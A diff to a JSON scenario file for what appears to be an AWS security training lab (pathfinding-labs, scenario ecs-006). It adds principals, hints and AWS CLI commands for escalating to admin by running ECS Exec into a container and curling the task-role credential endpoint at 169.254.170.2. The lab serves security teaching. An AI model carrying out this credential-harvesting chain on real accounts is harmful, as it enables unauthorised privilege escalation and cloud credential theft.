@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via ecs:ExecuteCommand + ecs:DescribeTasks",
+  "displayName": "ECS Execute Command to Admin",
   "name": "ecs-006-ecs-executecommand+describetasks",
   "description": "Shelling into a running ECS task with an admin role to retrieve credentials from the container metadata service",
   "costEstimate": "$9/mo",
@@ -31,16 +31,18 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-006-ecs-executecommand+describetasks"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-006-ecs-executecommand+describetasks",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "ecs:ExecuteCommand",
+        "principal": "pl-prod-ecs-006-to-admin-starting-user",
         "resource": "arn:aws:ecs:*:*:task/pl-prod-ecs-006-to-admin-cluster/*",
         "description": "establishes the interactive shell session in the running container"
       },
       {
         "permission": "ecs:DescribeTasks",
+        "principal": "pl-prod-ecs-006-to-admin-starting-user",
         "resource": "arn:aws:ecs:*:*:task/pl-prod-ecs-006-to-admin-cluster/*",
         "description": "required internally by the AWS CLI to retrieve the container runtime ID for the SSM session"
       }
@@ -48,14 +50,17 @@
     "helpful": [
       {
         "permission": "ecs:ListTasks",
+        "principal": "pl-prod-ecs-006-to-admin-starting-user",
         "purpose": "discover task ARNs in the cluster"
       },
       {
         "permission": "ecs:DescribeTaskDefinition",
+        "principal": "pl-prod-ecs-006-to-admin-starting-user",
         "purpose": "get task definition to discover task role ARN"
       },
       {
         "permission": "ecs:ListClusters",
+        "principal": "pl-prod-ecs-006-to-admin-starting-user",
         "purpose": "discover ECS clusters in the account"
       }
     ]
@@ -131,18 +136,30 @@
         "label": "ecs:ExecuteCommand + ecs:DescribeTasks",
         "description": "Use ecs:ExecuteCommand (backed by SSM Session Manager) to establish an interactive shell session inside the running container. The AWS CLI internally calls ecs:DescribeTasks to retrieve the container runtime ID needed to establish the session.\n",
         "hints": [
-          "You can run commands inside running ECS containers.",
-          "Look for ECS tasks that have privileged roles attached.",
-          "Browse to https://pathfinding.cloud/paths/ecs-006 for technique details."
+          "Use ecs:ListClusters to discover which ECS clusters exist in the account.",
+          "Once you know the cluster name, use ecs:ListTasks to enumerate running tasks in it.",
+          "Describe the task to see which IAM role is attached to it as the task role -- look at the task definition ARN and then describe the task definition.",
+          "Check whether ECS Exec is enabled on the task by looking for the managedAgents field and the ExecuteCommandAgent status in the describe-tasks output.",
+          "You have permission to run an interactive command inside the container -- think about what that lets you access from inside the container's environment.",
+          "You will need the AWS Session Manager plugin installed locally for ecs:ExecuteCommand to work. Install it before trying to establish the session.",
+          "Browse to https://pathfinding.cloud/paths/ecs-006 for full technique details."
         ],
         "commands": [
+          {
+            "description": "List ECS clusters in the account",
+            "command": "aws ecs list-clusters"
+          },
           {
             "description": "List tasks in the cluster",
             "command": "aws ecs list-tasks --cluster pl-prod-ecs-006-to-admin-cluster"
           },
           {
-            "description": "Describe the task to find the container name",
+            "description": "Describe the task to find the container name and task definition",
             "command": "aws ecs describe-tasks --cluster pl-prod-ecs-006-to-admin-cluster --tasks <task-arn>"
+          },
+          {
+            "description": "Describe the task definition to confirm the admin task role",
+            "command": "aws ecs describe-task-definition --task-definition <task-definition-arn>"
           },
           {
             "description": "Shell into the container",
@@ -156,9 +173,11 @@
         "label": "curl metadata service",
         "description": "From inside the container, query the ECS container metadata service to retrieve the temporary credentials for the task role. These credentials are then used outside the container to operate as the admin role.\n",
         "hints": [
-          "Query the container metadata service from inside the container.",
-          "The endpoint is at 169.254.170.2 using the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable.",
-          "curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI returns temporary credentials for the task role."
+          "Every ECS task running with a task role exposes temporary credentials through a metadata endpoint inside the container.",
+          "Look at the environment variables inside the container -- one of them points to the credentials endpoint path.",
+          "The credentials endpoint is reachable at the link-local address 169.254.170.2 using the path in AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.",
+          "Use wget or curl from inside the container to fetch the credentials JSON from that endpoint.",
+          "The JSON response contains AccessKeyId, SecretAccessKey, and Token -- export all three as environment variables on your local machine after exiting the container."
         ],
         "commands": [
           {
